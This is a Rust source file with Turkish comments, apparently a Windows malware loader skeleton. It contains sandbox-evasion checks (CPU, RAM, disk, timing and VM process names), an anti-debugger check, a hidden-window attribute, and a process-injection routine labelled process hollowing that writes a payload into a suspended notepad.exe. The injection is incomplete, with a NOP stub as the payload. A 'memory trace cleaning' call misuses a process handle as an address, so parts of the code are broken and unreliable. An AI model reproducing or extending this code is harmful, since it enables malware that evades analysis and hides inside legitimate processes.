#![windows_subsystem = "windows"]

use std::{ptr, mem, ffi::CString};
use winapi::{
    um::{
        winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        processthreadsapi::{GetCurrentProcess, CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread},
        memoryapi::{VirtualProtect, VirtualAllocEx, WriteProcessMemory},
        handleapi::CloseHandle,
        debugapi::IsDebuggerPresent,
        winbase::{CREATE_SUSPENDED},
    },
    shared::minwindef::{LPVOID, DWORD},
};
use lazy_static::lazy_static;
use sysinfo::{System, SystemExt, Process, ProcessExt};
use rand::Rng;
use std::time::{Instant, Duration};

// Gizli mesajı statik olarak saklayalım
lazy_static! {
    static ref HIDDEN_MESSAGE: String = String::from("Driver başlatıldı");
}

// Anti-VM kontrolleri
fn detect_vm() -> bool {
    let sys = System::new_all();
    
    // CPU core sayısı kontrolü (VM'ler genelde az core'lu)
    if sys.cpus().len() < 2 {
        return true;
    }

    if sys.disks().len() < 2 {
        return true;
    }

    // RAM miktarı kontrolü (4GB'dan az ise muhtemelen VM)
    if sys.total_memory() < 4_000_000 {
        return true;
    }

    // Timing kontrolü (VM'lerde işlemler daha yavaş)
    let start = Instant::now();
    let mut x = 0;
    for _ in 0..1_000_000 {
        x += rand::thread_rng().gen_range(1..100);
    }
    if start.elapsed() > Duration::from_millis(100) {
        return true;
    }

    // Yaygın VM process'lerini kontrol et
    for process in sys.processes().values() {
        let name = process.name().to_lowercase();
        if name.contains("vmware") || 
           name.contains("virtualbox") || 
           name.contains("vbox") || 
           name.contains("qemu") {
            return true;
        }
    }

    false
}

// Process Hollowing implementasyonu
unsafe fn process_hollow(target_path: &str, payload: &[u8]) -> bool {
    let mut si: STARTUPINFOA = mem::zeroed();
    let mut pi: PROCESS_INFORMATION = mem::zeroed();
    si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;

    // Target process'i suspended olarak başlat
    let target_path = CString::new(target_path).unwrap();
    if CreateProcessA(
        ptr::null(),
        target_path.as_ptr() as *mut _,
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut si,
        &mut pi
    ) == 0 {
        return false;
    }

    // Payload için bellek ayır
    let payload_size = payload.len();
    let remote_buffer = VirtualAllocEx(
        pi.hProcess,
        ptr::null_mut(),
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if remote_buffer.is_null() {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Payload'ı yaz
    let mut bytes_written = 0;
    if WriteProcessMemory(
        pi.hProcess,
        remote_buffer,
        payload.as_ptr() as LPVOID,
        payload_size,
        &mut bytes_written
    ) == 0 {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Thread'i devam ettir
    ResumeThread(pi.hThread);

    // Handle'ları temizle
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    true
}

// Anti-debug kontrolleri
fn check_debugger() -> bool {
    unsafe {
        IsDebuggerPresent() != 0
    }
}

// Bellek izlerini temizleme
fn clean_memory_traces(addr: *mut u8, size: usize) {
    unsafe {
        let mut old_protect: u32 = 0;
        VirtualProtect(
            addr as _,
            size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );
        ptr::write_bytes(addr, 0, size);
        VirtualProtect(
            addr as _,
            size,
            old_protect,
            &mut old_protect,
        );
    }
}

fn main() {
    // VM kontrolü
    if detect_vm() {
        return;
    }

    // Debug kontrolü
    if check_debugger() {
        return;
    }

    println!("{}", *HIDDEN_MESSAGE);


    let target = "C:\\Windows\\System32\\notepad.exe";
    let payload = b"\x90\x90\x90"; // NOP sled
    
    unsafe {
        if !process_hollow(target, payload) {
            return;
        }
    }

    // Driver's main
    unsafe {
        let process_handle = GetCurrentProcess();
       

        // Sheees
        clean_memory_traces(process_handle as *mut u8, mem::size_of::<HANDLE>());
    }
} 